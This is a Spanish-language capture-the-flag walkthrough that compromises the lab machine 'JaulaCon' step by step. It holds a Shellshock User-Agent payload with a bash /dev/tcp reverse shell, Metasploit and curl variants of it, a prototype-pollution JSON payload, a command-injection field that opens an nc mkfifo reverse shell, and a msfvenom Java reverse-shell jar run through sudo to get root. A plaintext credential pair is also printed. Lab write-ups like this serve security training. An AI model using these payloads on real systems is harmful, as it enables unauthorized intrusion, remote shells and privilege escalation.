PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3333/tcp open  dec-notes
8080/tcp open  http-proxy

-Haciendo fuzzing en el puerto 8080 encontramos la ruta /cgi-bin/ , puede ser una vulnerabilidad Shellshock!!

-Hacemos fuzzing a la ruta /cgi-bin/ usando la extensión --> cgi , para buscar posibles tareas que se estén ejecutando y sean vulnerables:
	-gobuster dir -u http://192.168.1.146/cgi-bin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x cgi
		agua.cgi

-Visitamos la URL http://192.168.1.146/cgi-bin/agua.cgi y efectivamente es una tarea que parece vulnerable a ShellShock Attack. 2 Formas de explotarlo:
	1-Manual con BurpSuite
		-Interceptamos la petición en /cgi-bin/agua.cgi 
		-Inyectamos el siguiente Payload en el user-agent y obtenemos acceso:
			-User-Agent: () { :; }; echo; echo;/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/1234 0>&1'
				www-data@989364fb5051:/$
	2-Metasploit: Módulo --> **exploit/multi/http/apache_mod_cgi_bash_env_exec**
		-set lport IP
		-set rhosts IP
		-set rport 8080
		-set set targeturi /cgi-bin/agua.cgi
		-run
			-meterpreter > getuid
				-www-data
	3-Con Curl:
		-curl -s -X GET "http://192.168.1.146:8080/cgi-bin/agua.cgi" -H  "User-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/1234 0>&1'"

## Escalada de Privilegios

-Encontramos fichero con credenciales en /opt/
	-cat /opt/.credenciales
		Shellychosk:Portidrea345ñ

-Las introducimos en el login de --> http://192.168.1.146:3333/login

-Nos encontramos un input para poner una URL y descargar contenido, interceptamos la petición

-Se va a acontecer una vulnerabilidad --> **Prottotype Pollution**

-Tenemos que hacer una petición POST a '/admin/check_url' , aplicamos la siguiente configuración:
	-Cambiamos el content-type a :  **Content-Type: application/json**
	-Mandamos el siguiente contenido:
		{
			"url":"http://192.168.1.135",
			"__proto__":{
				"isAdmin":"true"
			}
		}

-Una vez tenemos lista la petición, borramos el último valor de la cookie y mandamos la petición:
	-Nos tiene que devolver un --> Forbidden

-Después volvemos a mandar la petición. esta vez con la cookie completa (añadimos el valor que habíamos quitado antes)
	-Nos devuelve --> File downloaded

-Nos mandamos una reverse shell con la siguiente sintaxis:
	{
		"url":    ";`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.135 4444 >/tmp/f` #"
	}          	   

-Hemos recibido la conexión y ahora somos el usuario 'jaula':
	jaula@JaulaCon:/$ sudo -l
		/usr/bin/java

-Para escalar a root, tenemos que generar un Payload .jar y ejecutarlo desde la máquina víctima:
	-Generamos el Payload: 
		-msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.135 LPORT=5555 -f jar -o shell.jar
	-Lo descargamos en la máquina víctima y le damos permisos de ejecución
	-Lo ejecutamos de la siguiente manera y recibimos la shell como root:
		-sudo /usr/bin/java -jar shell.jar

root@JaulaCon:/tmp# whoami
root


